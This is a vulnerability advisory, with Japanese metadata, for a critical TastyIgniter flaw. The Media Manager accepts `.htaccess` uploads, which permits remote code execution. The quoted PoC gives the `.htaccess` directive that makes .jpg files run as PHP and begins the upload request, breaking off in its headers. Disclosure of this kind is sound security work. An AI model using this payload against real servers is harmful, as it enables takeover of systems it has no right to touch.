# TastyIgniter allows Remote Code Execution \(RCE\) via Unrestricted file upload in Media Manager

- **ID**: CVE\-2026\-69179 / GHSA\-7wwv\-x6mc\-pxqx
- **危険度**: Critical（緊急） (CVSS 9.1)
- **言語**: PHP
- **パッケージ**: Packagist/tastyigniter/tastyigniter &lt; 4\.3\.1 → 4\.3\.1
- **公開**: 2026-11-25

## 原文

\#\#\# Summary Media manager accepts \`\.htaccess\` file which can be used to perform RCE\. \#\#\# Details The file upload functionality from media manager somehow accepts \`\.htaccess\` file\. This file could be used to allow any extension to run PHP command\. By doing so, it is possible to perform RCE\. \#\#\# PoC \- Login as Admin \- Create a \`\.htaccess\` file with the following code\. \`\`\` &lt;FilesMatch "\\\.jpg\$"&gt; SetHandler application/x\-httpd\-php &lt;/FilesMatch&gt; \`\`\` \- Upload the \`\.htaccess\` file via the Media Manager\. Request \`\`\` POST /admin/media\_manager HTTP/1\.1 Host\: localhost\:8888 Content\-Length\: 357 sec\-ch\-ua\-p
